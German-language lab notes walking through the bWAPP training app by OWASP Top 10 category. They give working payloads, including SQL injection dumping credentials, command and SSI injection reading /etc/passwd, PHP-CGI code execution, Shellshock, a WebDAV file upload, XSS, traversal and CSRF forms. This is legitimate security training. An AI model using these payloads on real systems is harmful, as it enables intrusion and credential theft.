### // A1 - Injections //
---
##### HTML Injection - Reflected (GET)
Da die Kommunikation zwischen der Lokalen bwapp instanz zum Browser über http verläuft, werden Daten in cleartext versendet. Entsprechend macht es einem Angreiffer leicht vom Browser gesendete Informationen auszulesen.
~~~
GET /htmli_get.php?firstname=My-First-Name&lastname=My-Last-Name&form=submit HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_get.php
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
~~~
Manipulator: <br>
~~~
GET /htmli_get.php?firstname=MANIPULIERT&lastname=MANIPULIERT&form=submit HTTP/1.1
~~~

---
##### HTML Injection - Reflected (POST)
Der unterschied zum obigen Beispiel (GET) ist dass hier die Daten über HTTP POST versendet werden. Stellt sich der Angreiffer zwischen Client(Browser) und dem Webserver können ebenfalls Informatonen ausgelesen werden.
~~~
POST /htmli_post.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_post.php
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
firstname=My-First-Name&lastname=My-Last-Name&form=submit
~~~
Manipulator: <br>
~~~
firstname=MANIPULATIERT&lastname=MANIPULIERT&form=submit
~~~

---
##### HTML Injection - Reflected (Current URL)
Die URL variable sieht folgendermassen aus:
~~~~
$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
~~~~
Da die Variable auf dem serverseitig verarbeitet wird, kann ein Angreiffer die Antwort vom Webserver entsprechend verändern.<br>
Der Client versendet die folgende HTTP Anfrage:
~~~
GET /htmli_current_url.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
~~~
Der Clienst fragt nach ``/html_current_url.php`` welches vom Angreiffer entsprechend verändert werden kann so dass der Client vom Webserver eine andere ressource als die erwartete erhält.<br>
Der Webserver Antwortet mit:
~~~
HTTP/1.1 200 OK
Date: Sat, 09 Sep 2017 10:35:02 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 13003
[...]
    <p align="left">Your current URL: <i>http://localhost:8083/htmli_current_url.php</i></p>    
[...]
</html>
~~~
Da die URLS auf dem Webserver generiert wird, kann mit dem untenstehenden Manipulator die Antwort verändert werden.<br>
~~~
[...]
    <p align="left">Your current URL: <i>http://localhost:8083/MANIPULIERT</i></p>    
[...]
~~~

---
##### HTML Injection - Stored (Blog)
Auf der bwapp wir ein beispiel einbes Blogs präsentiert. Folgende Funktionen bietet die Blogapplikation an:<br>
- Neuer Blog Eintrag erstellen
- Blog Einträge anzeigen
- Blog Einträge löschen
<br>

Wird ein neue Blogeintrag erstellt kann der entsprechende HTTP POST request mit burp abgefangen werden: <br>
~~~
POST /htmli_stored.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_stored.php
Cookie: security_level=2; PHPSESSID=hm3cj6r85a9bijmiqo9cng7uf5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
URI: entry=My+blog+post&blog=submit&entry_add=
~~~
Da keine HTTPS verschüsselung vorahnden ist, kann der Blog eintrag via burp einfach abgeändert werden:<br>
~~~
POST /htmli_stored.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_stored.php
Cookie: security_level=2; PHPSESSID=hm3cj6r85a9bijmiqo9cng7uf5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
URI: entry=INTERCEPTED+BLOG+POST&blog=submit&entry_add=
~~~
! ! ! Die content länge(Content-Length) sollte beim manipulieren beachtet werden. Wird diese unter- oder überschritten könnte es dazu führen dass der Angriff erkannt wird und der POST nicht erfolgreich abgesetzt werden kann.

---
##### iFrame Injection
~~~js
ParamUrl=robots.txt" onload="alert(1)
ParamHeight="></iframe><script>alert(1);</script>
~~~

---
##### LDAP Injection (Search)
---
##### Mail Header Injection (SMTP)
---
##### OS Command Injection
~~~
localhost:8083; cat /etc/passwd
localhost:8083 & cat /etc/passwd
localhost:8083 | cat /etc/passwd
~~~

---
##### OS Command Injection - Blind
~~~
localhost:8083 | sleep 10
~~~
---
##### PHP Code Injection
~~~php
/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
~~~

---
##### Server-Side Includes (SSI) Injection
~~~htm
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
~~~

---
##### SQL Injection (GET/Search)
~~~SQL
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
~~~

---

##### SQL Injection (GET/Select)
~~~SQL
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
~~~

---
##### SQL Injection (POST/Search)
~~~~SQL
/bWAPP/sqli_6.php

a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- 
~~~~

---
##### SQL Injection (POST/Select)
~~~SQL
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--

a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";--

blah%' union all select 1,login,password,email,secret,1, 1 from users --

~~~


---
##### SQL Injection (AJAX/JSON/jQuery)
---
##### SQL Injection (CAPTCHA)
---
##### SQL Injection (Login Form/Hero)
~~~SQL
ok' or 1=1-- 
~~~
---
##### SQL Injection (Login Form/User)
---
##### SQL Injection (SQLite)
~~~SQL
a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
~~~


---
##### SQL Injection (Drupal)
---
##### SQL Injection - Stored (Blog)
~~~
--Hier sollte am ende ein Leerzeichen stehen!
asdf',(SELECT database()  ))-- 
~~~
Tabellen nach einander auswerten:
~~~
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))-- 
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 1,1  ))-- 
~~~
~~~
asdf',(select password from mysql.user where user='root' ))-- 
~~~

---
##### XML/XPath Injection (Login Form)
~~~
password=' or id='2
~~~
---
##### XML/XPath Injection (Search)
~~~
genre=')]/password | a[contains(a,'
genre=') or contains(genre, '
genre=') or not(contains(genre, 'xxx') and '1'='2
~~~

---

### // A2 - Broken Authentication	/	Session	Management //
---
##### Broken Authentication - CAPTCHA Bypassing
Sicherstellen das captcha_box.php nicht geladen wird. Dort wird die Session Varible geladen.
$_SESSION["captcha"] erfordert eine prüfung. Mittels Burp kann eine übermittlung von captcha user vermieden werden.
~~~
POST /bWAPP/ba_captcha_bypass.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8083/bWAPP/ba_captcha_bypass.php
Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=2
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

login=bee&password=bug&form=submit
~~~
---
##### Broken Authentication - Logout Management
> Öffnet man ein neues Tab und meldet sich von der Seite ab, bleibt die Session vorhanden.

---
##### Broken Authentication - Password Attacks
---
##### Broken Authentication - Weak Passwords
---
##### Session Management - Administrative Portals
In der URL und den Cookies:
~~~
admin=1
~~~

---

### // A3 - CROSS	SITE	SCRIPTING	(XSS) //
---
##### Cross-Site Scripting - Reflected (GET)
xss_get.php <br>
~~~
<script>alert(document.cookie)</script>
~~~
---
##### Cross-Site Scripting - Reflected (POST)
xss_post.php
~~~
<script>alert(document.cookie)</script>
~~~
---
##### Cross-Site Scripting - Reflected (JSON)
xss_json.php
~~~
"}]}';prompt(0)</script>
~~~
---
##### Cross-Site Scripting - Reflected (AJAX/JSON)
xss_ajax_2-1.php
~~~
&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
~~~
---
##### Cross-Site Scripting - Reflected (AJAX/XML)
xss_ajax_1-1.php
~~~
&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
~~~
---
##### Cross-Site Scripting - Reflected (Back Button)
Referer header feld:
~~~
Referer: ';alert(1);'
~~~
---
##### Cross-Site Scripting - Reflected (Custom Header)
Im header folgendes beifügen:
~~~
<script>alert(1)</script>
~~~
---
##### Cross-Site Scripting - Reflected (Eval)
~~~
date=alert(1)
~~~
---
##### Cross-Site Scripting - Reflected (HREF)
~~~
Referer: <script>alert(1)</script>
~~~
---
##### Cross-Site Scripting - Reflected (User-Agent)
~~~
User-Agent: <script>alert(1)</script>
~~~

---

### // A4 - INSECURE DIRECT OBJECT REFERENCES //
---
##### Insecure DOR (Change Secret)

Mit burp können versteckte elemente angezeigt werden.<br>
Oder es können die POST Parameter abgefangen werden.

---
##### Insecure DOR (Reset Secret)
Das "Login" und "Secret" feld kann angepasst werden:
~~~
POST /bWAPP/xxe-2.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Referer: http://localhost:8083/bWAPP/insecure_direct_object_ref_3.php
Content-Length: 59
Cookie: PHPSESSID=77aa634b546d1c78d5afc16aae328172; security_level=2
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<reset><login>bee</login><secret>Any bugs?</secret></reset>
~~~

---
##### Insecure DOR (Order Tickets)
bWAPP/insecure_direct_object_ref_2.php <br>
Mit burp können vesteckte ticketpreise angezeigt werden. 
Oder die POST Paramter während der übetragung über ein Proxy manipulieren.

---

### // A5 - Security Misconfiguration //
---
##### Arbitrary File Access (Samba)
---
##### Cross-Domain Policy File (Flash)
---
##### Cross-Origin Resource Sharing (AJAX)
~~~
<html>
    <head>
    <script>
        function steal() {
            var r = new XMLHttpRequest();
            r.onreadystatechange = function() {
                if (r.readyState == 4 && r.status == 200) {
                    alert(r.responseText);
                }
            };
            r.open("GET", "http://localhost:8083/bWAPP/secret-cors-1.php", true);
            r.send();
        }
    </script>
    </head>
    <body onload="steal()">
    </body>
</html>
~~~

---
##### Cross-Site Tracing (XST)
---
##### Denial-of-Service (Large Chunk Size)
---
##### Denial-of-Service (Slow HTTP DoS)
---
##### Denial-of-Service (SSL-Exhaustion)
---
##### Denial-of-Service (XML Bomb)
---
##### Insecure FTP Configuration
>Falls anonyme authentifizierung aktiviert ist und schreiberechte vergeben wird, ist kein Login/Passwort notwendig.
---
##### Insecure SNMP Configuration
---
##### Insecure WebDAV Configuration
~~~
curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/etc/passwd")); fclose($f); ?>' 'http://localhost:8083/webdav/attack.php'
~~~
---
##### Local Privilege Escalation (sendpage)
---
##### Local Privilege Escalation (udev)
---
##### Man-in-the-Middle Attack (HTTP)
---
##### Man-in-the-Middle Attack (SMTP)
---
##### Old/Backup & Unreferenced Files
---
##### Robots File


---

### // A6 - Sensitive Data Exposure //
---
##### Base64 Encoding (Secret)
-> Mittels Burp Cookie auslesen
-> Decoder
Ergebnis: Any bugs?
---
##### BEAST/CRIME/BREACH Attacks
---
##### Clear Text HTTP (Credentials)
---
##### Heartbleed Vulnerability
unter "/evil" ist ein Python Script hinterlegt.
~~~
python heartbleed.py 127.0.0.1
~~~
---
##### Host Header Attack (Reset Poisoning)
---
##### HTML5 Web Storage (Secret)
---
##### POODLE Vulnerability
---
##### SSL 2.0 Deprecated Protocol
---
##### Text Files (Accounts)


---

### // A7 - Missing Functional Level Access Control //
---
##### Directory Traversal - Directories
~~~
/bWAPP/directory_traversal_2.php?directory=../../../../home/
~~~
Mittels "../" kann jeweils eine Orderebene nach oben gewandert werden.

---
##### Directory Traversal - Files
~~~
/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
~~~
Somit können bekannte Datein einfach ausgelesen werden. <br>
Hier bsp: /etc/passwd

---
##### Host Header Attack (Cache Poisoning)

kann mit "hostheader_1.php" ausgeführt werden.

---
##### Host Header Attack (Reset Poisoning)

kann mit "hostheader_2.php" ausgeführt werden.

---
##### Local File Inclusion (SQLiteManager)
---
##### Remote & Local File Inclusion (RFI/LFI)

rfi.txt nach rfi.php > PHP fügt die Dateiendung .php automatisch an.
~~~
bWAPP/rlfi.php?language=../evil/rfi
~~~
---
##### Restrict Device Access
~~~
User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 
~~~
---
##### Restrict Folder Access
---
##### Server Side Request Forgery (SSRF)
---
##### XML External Entity Attacks (XXE)

---

### // A8 - Corss-Site Request Forgery (CSRF) //

---
##### Cross-Site Request Forgery (Change Password)
~~~
<!DOCTYPE html>
<html>
<div id="main">
    <h1>CSRF (Change Password)</h1>
    <p>Change your password.</p>
    <form action="http://localhost:8083/bWAPP/csrf_1.php" method="GET">
        <p><label for="password_new">New password:</label><br>
        <input id="password_new" name="password_new" type="password"></p>

        <p><label for="password_conf">Re-type new password:</label><br>
        <input id="password_conf" name="password_conf" type="password"></p>  

        <button type="submit" name="action" value="change">Change</button>   
    </form>
</div>
</body></html>
~~~

---
##### Cross-Site Request Forgery (Change Secret)
~~~
<!DOCTYPE html>
<html>
<div id="main">  
<h1>CSRF (Change Secret)</h1>
<p>Change your secret.</p>
<form action="http://localhost:8083/bWAPP/csrf_3.php" method="POST">
    <p><label for="secret">New secret:</label><br>
    <input value="bug" id="secret" name="secret" type="text"></p>
    <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [login] <input name="login" value="bee"></div>
    <button type="submit" name="action" value="change">Change</button>
</form>
</div>
</body></html>
~~~

---
##### Cross-Site Request Forgery (Transfer Amount)
~~~
<!DOCTYPE html>
<html><head>
<div id="main">   
<h1>CSRF (Transfer Amount)</h1>
<p>Amount on your account: <b> 100 CHF</b></p>
<form action="http://localhost:8083/bWAPP/csrf_2.php" method="GET">
    <p><label for="account">Account to transfer:</label><br>
    <input id="account" name="account" value="123-45678-90" type="text"></p>
    <p><label for="amount">Amount to transfer:</label><br>
    <input id="amount" name="amount" value="0" type="text"></p>
    <button type="submit" name="action" value="transfer">Transfer</button>   
</form>
</div>
    
</body></html>
~~~


---

### // A9 - Using Known Vulnerable Components //
---
##### Buffer Overflow (Local)
---
##### Buffer Overflow (Remote)
---
##### Drupal SQL Injection (Drupageddon)
---
##### Heartbleed Vulnerability
---
##### PHP CGI Remote Code Execution
~~~
POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 70
Cookie: security_level=2; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
Connection: close

<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
~~~
Hiermit kann der Inhalt ausgegeben werden:
~~~
http://localhost:8083/bWAPP/admin/phpinfo.php?-s
~~~

---
##### Shellshock Vulnerability (CGI)
Folgende Anfragen sollten modifiziert werden:
~~~
/bWAPP/cgi-bin/shellshock.sh
~~~

~~~
Referer: () { nothing;}; /bin/touch /tmp/malicious
~~~

~~~
Referer: () { nothing;}; /bin/touch /etc/passwd
~~~


---
##### SQLiteManager Local File Inclusion
---
##### SQLiteManager PHP Code Injection
---
##### SQLiteManager XSS


---


### // A10 - Unvalidated Redirects & Forwards //
---
##### Unvalidated Redirects & Forwards (1)
---
##### Unvalidated Redirects & Forwards (2)

